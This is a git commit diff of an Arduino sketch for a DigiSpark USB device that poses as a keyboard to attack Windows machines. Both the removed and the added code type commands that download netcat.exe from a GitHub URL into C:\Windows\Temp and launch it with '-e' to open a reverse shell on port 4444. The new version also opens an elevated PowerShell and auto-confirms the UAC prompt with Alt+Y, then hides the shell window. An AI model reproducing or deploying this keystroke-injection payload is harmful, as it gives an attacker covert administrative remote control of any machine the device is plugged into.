da28da0966a41717f6b40293a5edbacd8fc02737
Rafael Menezes Barboza <ra29fa@gmail.com>
2022-08-09 16:15:16 -0300

    Update Attack-DigiSpark-Win.ino

--- Attack-DigiSpark-Win.ino
+++ Attack-DigiSpark-Win.ino
@@ -3,14 +3,20 @@
 
 void setup() {
   DigiKeyboard.sendKeyStroke(0);
-  DigiKeyboard.delay(1000);  
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-  DigiKeyboard.delay(2000);
-  DigiKeyboard.print("cmd");
-  DigiKeyboard.delay(1000);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.println("powershell Start-Process powershell -Verb runAs");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(3000);
-  DigiKeyboard.print("powershell $ip = '192.168.122.1';$port = '4444';Invoke-WebRequest https://github.com/tomiodarim/Digispark/blob/main/payloads/netcat.exe?raw=true -o C:\\Windows\\Temp\\nc.exe;C:\\Windows\\Temp\\nc.exe -e cmd.exe $ip $port -d;exit");
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print("Invoke-WebRequest https://github.com/tomiodarim/Digispark/blob/main/payloads/netcat.exe?raw=true -o C:\\Windows\\Temp\\nc.exe;");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER); 
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print("Start-Process 'C:\\Windows\\Temp\\nc.exe' -ArgumentList '-e powershell.exe','127.0.0.1','4444' -WindowStyle Hidden");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print("exit");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 }
 
